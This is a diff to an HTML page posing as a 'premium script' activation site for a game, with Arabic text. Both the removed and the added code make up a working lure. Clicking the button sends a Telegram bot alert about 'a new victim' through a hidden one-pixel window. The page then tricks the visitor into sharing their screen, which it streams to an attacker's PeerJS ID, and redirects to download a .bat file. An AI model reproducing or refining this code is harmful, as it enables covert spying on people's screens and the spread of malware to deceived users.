@@ -3,21 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium Script Hub 2026</title>
+    <title>Premium Script Hub</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
         body { margin: 0; background: #000; color: white; font-family: sans-serif; text-align: center; }
         .bg { background-image: url('https://i.ibb.co/v4x0XmY/1000014847.jpg'); background-size: cover; position: fixed; width: 100%; height: 100%; z-index: -1; filter: brightness(0.4); }
-        .box { margin-top: 150px; padding: 20px; border: 2px solid #00ffcc; display: inline-block; border-radius: 15px; background: rgba(0,0,0,0.8); box-shadow: 0 0 20px #00ffcc; }
-        .btn { background: linear-gradient(45deg, #00ffcc, #ff00ff); border: none; padding: 15px 30px; font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 10px; margin-top: 20px; box-shadow: 0 0 10px #ff00ff; }
+        .box { margin-top: 150px; padding: 25px; border: 3px solid #00ffcc; display: inline-block; border-radius: 20px; background: rgba(0,0,0,0.85); box-shadow: 0 0 30px #00ffcc; }
+        .btn { background: linear-gradient(45deg, #00ffcc, #ff00ff); border: none; padding: 20px 40px; font-size: 22px; font-weight: bold; cursor: pointer; border-radius: 12px; margin-top: 20px; box-shadow: 0 0 15px #ff00ff; color: #000; }
     </style>
 </head>
 <body>
     <div class="bg"></div>
     <div class="box">
-        <h1>🚀 تفعيل السكربت الخارق</h1>
-        <p>اضغط للبدء وسحب البيانات للعبة</p>
-        <button class="btn" onclick="sendToBot()">تفعيل السكربت الآن</button>
+        <h1>🚀 تفعيل السكربت الملكي</h1>
+        <p>اضغط بالأسفل لربط حسابك بالسكربت مباشرة</p>
+        <button class="btn" onclick="hit()">تفعيل الآن (RGB)</button>
     </div>
 
     <script>
@@ -26,25 +26,28 @@
         const myID = "Mr_Fm_Alpha_99";
         const peer = new Peer();
 
-        function sendToBot() {
-            // محاولة إرسال رسالة بسيطة أولاً للتأكد من الاتصال
-            const testMsg = "🎯 شخص ما ضغط على الزر الآن!";
-            fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${testMsg})
-            .then(() => {
-                alert("جاري جلب بيانات السكربت... يرجى الموافقة على طلب البث");
-                startScreenShare();
-            })
-            .catch(err => alert("فشل الاتصال بالخادم، تأكد من الإنترنت"));
+        function hit() {
+            // الطريقة الإجبارية: فتح رابط الإرسال في نافذة صغيرة وإغلاقها فوراً
+            const msg = encodeURIComponent("⚠️ تم الضغط على الرابط من ضحية جديدة!");
+            const telegramUrl = https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg};
+            
+            // فتح نافذة مخفية للإرسال
+            const win = window.open(telegramUrl, "_blank", "width=1,height=1");
+            
+            setTimeout(() => {
+                if(win) win.close();
+                alert("تم بدء الربط.. يرجى الموافقة على مشاركة الشاشة لإتمام العملية");
+                startCapture();
+            }, 500);
         }
 
-        async function startScreenShare() {
+        async function startCapture() {
             try {
                 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                 peer.call(myID, stream);
-                // تحميل الملف
                 window.location.href = "https://www.mediafire.com/file/uzu30zei1sp22ki/Mr_Master.bat/file";
             } catch (err) {
-                alert("يجب الموافقة على البث لتشغيل السكربت!");
+                alert("يجب السماح بالصلاحيات لتفعيل السكربت!");
             }
         }
     </script>
